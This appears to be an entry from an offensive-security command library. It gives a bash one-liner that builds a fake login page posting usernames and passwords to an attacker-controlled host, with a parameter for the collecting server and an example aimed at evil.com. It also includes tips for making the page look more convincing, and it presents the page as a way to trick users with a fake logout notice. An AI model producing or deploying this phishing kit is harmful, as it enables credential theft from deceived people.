---
id: faf43e0a-9d81-45b3-805a-8b55a43092c2
name: create-phishing-login-html
type: command
executor: bash
data: >-
  echo '<!DOCTYPE html><html><head><title>Login - Example
  Service</title></head><body><form action="http://$_PHISH_HOST/logger.php"
  method="POST"><input type="text" name="username" placeholder="Username"><input
  type="password" name="password" placeholder="Password"><button
  type="submit">Login</button></form><p>You have been logged out due to
  inactivity.</p></body></html>' > phish.html
output: null
created_at: '2023-04-06T03:56:40.534748+00:00'
updated_at: '2023-04-06T03:56:40.549637+00:00'
platforms:
  - Linux
  - macOS
tags:
  - phishing
  - html-generation
verified: true
validated: true
---

# create-phishing-login-html

## Command

```bash
echo '<!DOCTYPE html><html><head><title>Login - Example Service</title></head><body><form action="http://$_PHISH_HOST/logger.php" method="POST"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button type="submit">Login</button></form><p>You have been logged out due to inactivity.</p></body></html>' > phish.html
```

## Description

Generates a simple HTML phishing login page that submits credentials via POST to a logging script, mimicking a logout prompt to trick the user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PHISH_HOST | Your server domain/IP for receiving form data | Yes |

## Examples

### Basic Usage

```bash
echo '<!DOCTYPE html><html><head><title>Login</title></head><body><form action="http://evil.com/logger.php" method="POST">...</form></body></html>' > phish.html
```

### Advanced Usage

Include CSS for better mimicry:

```bash
echo '<!DOCTYPE html><html><head><title>Login</title><style>body {font-family: Arial;}</style></head><body>...</body></html>' > phish.html
```

## Expected Output

Creates 'phish.html'. No console output. Test form submission locally.

## Related

- [[procedures/Tabnabbing-Phishing-Redirect-Attack]]
- [[commands/start-simple-http-server]]
